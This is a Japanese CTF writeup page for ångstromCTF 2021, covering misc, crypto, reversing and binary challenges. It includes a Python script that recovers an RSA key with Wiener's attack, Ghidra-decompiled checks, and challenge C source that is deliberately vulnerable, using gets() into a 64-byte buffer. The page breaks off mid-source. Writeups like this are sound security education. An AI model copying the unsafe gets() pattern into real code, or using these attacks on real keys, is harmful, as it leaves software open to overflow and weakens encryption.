@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>ångstromCTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://2021.angstromctf.com/challenges 昨年のイベントに比べて、だいぶ難易度が高かった気がします。 390点を獲得し、最終順位はキリのいい500位でした。 以下は解いたチャレンジで" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.78f8f17bab244b9ee62ad16480c9584d5fc2db06ae20681d1ca225cefd80767c.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="ångstromCTF 2021 Writeup" />
+<meta property="og:description" content="URL: https://2021.angstromctf.com/challenges 昨年のイベントに比べて、だいぶ難易度が高かった気がします。 390点を獲得し、最終順位はキリのいい500位でした。 以下は解いたチャレンジで" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2021/" />
+<meta property="article:published_time" content="2021-04-08T13:00:00+09:00" />
+<meta property="article:modified_time" content="2021-04-08T13:00:00+09:00" />
+<meta itemprop="name" content="ångstromCTF 2021 Writeup">
+<meta itemprop="description" content="URL: https://2021.angstromctf.com/challenges 昨年のイベントに比べて、だいぶ難易度が高かった気がします。 390点を獲得し、最終順位はキリのいい500位でした。 以下は解いたチャレンジで">
+<meta itemprop="datePublished" content="2021-04-08T13:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-04-08T13:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1535">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ångstromCTF 2021 Writeup"/>
+<meta name="twitter:description" content="URL: https://2021.angstromctf.com/challenges 昨年のイベントに比べて、だいぶ難易度が高かった気がします。 390点を獲得し、最終順位はキリのいい500位でした。 以下は解いたチャレンジで"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">ångstromCTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-04-08 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-archaic-50-points">[Misc]: Archaic (50 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-fish-60-points">[Misc]: Fish (60 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-relatively-simple-algorithm-40-points">[Crypto]: Relatively Simple Algorithm (40 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-keysar-v2-40-points">[Crypto]: Keysar v2 (40 points)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-sosig-70-points">[Crypto]: sosig (70 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev-free-flags1-50-points">[Rev]: FREE FLAGS!!1!! (50 points)</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-tranquil-70-points">[Binary]: tranquil (70 points)</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://2021.angstromctf.com/challenges">https://2021.angstromctf.com/challenges</a>
+<br /><br /></p>
+<p><a href="https://captureamerica.github.io/writeups/post/angstromctf_2020/">昨年のイベント</a>に比べて、だいぶ難易度が高かった気がします。</p>
+<br>
+390点を獲得し、最終順位はキリのいい500位でした。<br />
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_score.png" alt="angstromctf_2021_score.png">
+<br>
+<p>以下は解いたチャレンジです。（後日、Surveyもやってます。）<br />
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_solves.png" alt="angstromctf_2021_solves.png"></p>
+<p><br /><br /></p>
+<h2 id="misc-archaic-50-points">[Misc]: Archaic (50 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>The archaeological team at ångstromCTF has uncovered an archive from over 100 years ago! Can you read the contents?
+<br /><br />
+Access the file at /problems/2021/archaic/archive.tar.gz on the shell server.</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<pre>
+team7899@actf:~$ cp /problems/2021/archaic/archive.tar.gz .
+team7899@actf:~$ tar zxvf archive.tar.gz
+flag.txt
+tar: flag.txt: implausibly old time stamp 1921-04-01 22:45:12
+team7899@actf:~$ cat flag.txt
+cat: flag.txt: Permission denied
+team7899@actf:~$ ll
+total 52
+drwx------   3 team7899 team7899  4096 Apr  3 04:49 ./
+drwx--x--x 996 root     root     24576 Apr  3 04:49 ../
+-r--r--r--   1 team7899 team7899   150 Apr  3 04:49 archive.tar.gz
+-rw-r--r--   1 team7899 team7899   220 Feb 25  2020 .bash_logout
+-rw-r--r--   1 team7899 team7899  3771 Feb 25  2020 .bashrc
+drwx------   2 team7899 team7899  4096 Apr  3 04:49 .cache/
+----------   1 team7899 team7899    37 Apr  1  1921 flag.txt
+-rw-r--r--   1 team7899 team7899   807 Feb 25  2020 .profile
+team7899@actf:~$ id
+uid=1385(team7899) gid=1385(team7899) groups=1385(team7899),1001(teams)
+team7899@actf:~$ chmod 644 flag.txt
+team7899@actf:~$ cat flag.txt
+actf{thou_hast_uncovered_ye_ol_fleg}
+</pre>
+<p><br /></p>
+<p>Flag: <code>actf{thou_hast_uncovered_ye_ol_fleg}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="misc-fish-60-points">[Misc]: Fish (60 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Oh, fish! My dinner(fish.png) has turned transparent again. What will I eat now that I can&rsquo;t eat that yummy, yummy, fish head, mmmmmm head of fish mm so good&hellip;</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>fish.png</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>「青い空を見上げればいつもそこに白い猫」を使って解きました。</p>
+<img src="https://captureamerica.github.io/writeups/img/angstromctf_2021_fish.png" alt="angstromctf_2021_fish.png">
+<p><br /></p>
+<p>Flag: <code>actf{in_the_m0rning_laughing_h4ppy_fish_heads_in_th3_evening_float1ng_in_your_soup}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-relatively-simple-algorithm-40-points">[Crypto]: Relatively Simple Algorithm (40 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>RSA strikes strikes again again! Source (rsa.py)
+<br /><br />
+n = 113138904645172037883970365829067951997230612719077573521906183509830180342554841790268134999423971247602095979484887092205889453631416247856139838680189062511282674134361726455828113825651055263796576482555849771303361415911103661873954509376979834006775895197929252775133737380642752081153063469135950168223
+<br />
+p = 11556895667671057477200219387242513875610589005594481832449286005570409920461121505578566298354611080750154513073654150580136639937876904687126793459819369
+<br />
+q = 9789731420840260962289569924638041579833494812169162102854947552459243338614590024836083625245719375467053459789947717068410632082598060778090631475194567
+<br />
+e = 65537
+<br />
+c = 108644851584756918977851425216398363307810002101894230112870917234519516101802838576315116490794790271121303531868519534061050530562981420826020638383979983010271660175506402389504477695184339442431370630019572693659580322499801215041535132565595864123113626239232420183378765229045037108065155299178074809432</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>RsaCtfTool.pyで解けます。</p>
+<br>
+<p>Flag: <code>actf{old_but_still_good_well_at_least_until_quantum_computing}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-keysar-v2-40-points">[Crypto]: Keysar v2 (40 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Wow! Aplet sent me a message&hellip; he said he encrypted it with a key, but lost it. Gotta go though, I have biology homework!</p>
+</blockquote>
+<p>Attachment (中身は省略します):</p>
+<ul>
+<li>chall.py
+<br /></li>
+<li>out.txt</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>最初、chall.pyを解読しようと試みたんですが、out.txtが単一換字式暗号 (monoalphabetic substitution ciphers)っぽかったのと、solveした人数が多かったので、<a href="https://quipqiup.com/">quipqiup</a>を試したところ、あっさりフラグが取れました。</p>
+<p><br />
+Flag: <code>actf{keyedcaesarmorelikesubstitution}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="crypto-sosig-70-points">[Crypto]: sosig (70 points)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>Oh man, RSA is so cool. But I don&rsquo;t trust the professionals, I do things MY WAY. And I&rsquo;ll make my encryption EXTRA secure with an extra thicc e! You&rsquo;ll never crack it!
+<br><br>
+n: 14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853
+<br>
+e: 1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799
+<br>
+c: 13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>先日やったpicoCTF 2021のDachshund Attacksと同様の問題でした。</p>
+<p>以下のツールを使わせてもらいました。<br />
+<a href="https://github.com/orisano/owiener">https://github.com/orisano/owiener</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="kn">import</span> <span class="nn">owiener</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="mi">1565336867050084418175648255951787385210447426053509940604773714920538186626599544205650930290507488101084406133534952824870574206657001772499200054242869433576997083771681292767883558741035048709147361410374583497093789053796608379349251534173712598809610768827399960892633213891294284028207199214376738821461246246104062752066758753923394299202917181866781416802075330591787701014530384229203479804290513752235720665571406786263275104965317187989010499908261009845580404540057576978451123220079829779640248363439352875353251089877469182322877181082071530177910308044934497618710160920546552403519187122388217521799</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">14750066592102758338439084633102741562223591219203189630943672052966621000303456154519803347515025343887382895947775102026034724963378796748540962761394976640342952864739817208825060998189863895968377311649727387838842768794907298646858817890355227417112558852941256395099287929105321231423843497683829478037738006465714535962975416749856785131866597896785844920331956408044840947794833607105618537636218805733376160227327430999385381100775206216452873601027657796973537738599486407175485512639216962928342599015083119118427698674651617214613899357676204734972902992520821894997178904380464872430366181367264392613853</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">13067887214770834859882729083096183414253591114054566867778732927981528109240197732278980637604409077279483576044261261729124748363294247239690562657430782584224122004420301931314936928578830644763492538873493641682521021685732927424356100927290745782276353158739656810783035098550906086848009045459212837777421406519491289258493280923664889713969077391608901130021239064013366080972266795084345524051559582852664261180284051680377362774381414766499086654799238570091955607718664190238379695293781279636807925927079984771290764386461437633167913864077783899895902667170959671987557815445816604741675326291681074212227</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">owiener</span><span class="o">.</span><span class="n">attack</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">d</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Failed&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="c1"># print(hex(pow(c,d,n)))</span>
+    <span class="n">hex_string</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">))</span>
+    <span class="n">hex_string</span> <span class="o">=</span> <span class="n">hex_string</span><span class="p">[</span><span class="mi">2</span><span class="p">::]</span> <span class="c1"># To remove &#34;0x&#34;</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">bytearray</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>actf{d0ggy!!!111!1}</code></p>
+<p>＃やっぱりイヌ（ダックスフンド）なんですね。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="rev-free-flags1-50-points">[Rev]: FREE FLAGS!!1!! (50 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Clam was browsing armstrongctf.com when suddenly a popup appeared saying &ldquo;GET YOUR FREE FLAGS HERE!!!&rdquo; along with a download(free_flags). Can you fill out the survey for free flags?
+<br><br>
+Find it on the shell server at /problems/2021/free_flags or over netcat at nc shell.actf.co 21703.
+<br><br>
+Hint: Check out decompilers like GHIDRA.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>free_flags (ELF 64-bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-5">Solution</h3>
+<p>ヒントにある通り、ghidraを使って解きました。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ulong</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_128</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_124</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_120</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_11c</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">&#34;Congratulations! You are the 1000th CTFer!!! Fill out this short survey to get FREE FLAGS!!!&#34;</span>
+      <span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What number am I thinking of???&#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="mh">0x1020e1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_11c</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_11c</span> <span class="o">==</span> <span class="mh">0x7a69</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What two numbers am I thinking of???&#34;</span><span class="p">);</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d %d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_120</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_124</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">local_120</span> <span class="o">+</span> <span class="n">local_124</span> <span class="o">==</span> <span class="mh">0x476</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_120</span> <span class="o">*</span> <span class="n">local_124</span> <span class="o">==</span> <span class="mh">0x49f59</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What animal am I thinking of???&#34;</span><span class="p">);</span>
+      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34; %256s&#34;</span><span class="p">,</span><span class="n">local_118</span><span class="p">);</span>
+      <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strcspn</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+      <span class="n">local_118</span><span class="p">[</span><span class="n">sVar2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="s">&#34;banana&#34;</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wow!!! Now I can sell your information to the Russian government!!!&#34;</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Oh yeah, here</span><span class="se">\&#39;</span><span class="s">s the FREE FLAG:&#34;</span><span class="p">);</span>
+        <span class="n">print_flag</span><span class="p">();</span>
+        <span class="n">local_128</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong &gt;:((((&#34;</span><span class="p">);</span>
+        <span class="n">local_128</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong &gt;:((((&#34;</span><span class="p">);</span>
+      <span class="n">local_128</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<p>1つ目のチェック：</p>
+<p>0x7a69を10進数で入れました。</p>
+<p><code>31337</code></p>
+<br>
+<p>2つ目のチェック：</p>
+<p>0x49f59を素因数分解すると、3 · 241 · 419になります。足して1142になるのは以下の2つの値です。</p>
+<p><code>723 419</code></p>
+<br>
+<p>3つ目のチェック：</p>
+<p><code>banana</code></p>
+<p><br /></p>
+<p>Flag: <code>actf{what_do_you_mean_bananas_arent_animals}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="binary-tranquil-70-points">[Binary]: tranquil (70 points)</h2>
+<hr>
+<h3 id="challenge-6">Challenge</h3>
+<blockquote>
+<p>Finally, inner peace - Master Oogway
+<br><br>
+Connect with nc shell.actf.co 21830, or find it on the shell server at /problems/2021/tranquil.
+<br><br>
+Hint: The compiler gives me a warning about gets&hellip; I wonder why.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>tranquil.c</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">win</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    
+    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Missing flag.txt. Contact an admin if you see this on remote.&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+    
+    <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+
+
+
+<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enter the secret word: &#34;</span><span class="p">);</span>
+    
+    <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">password</span><span class="p">);</span>
+    
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="s">&#34;password123&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
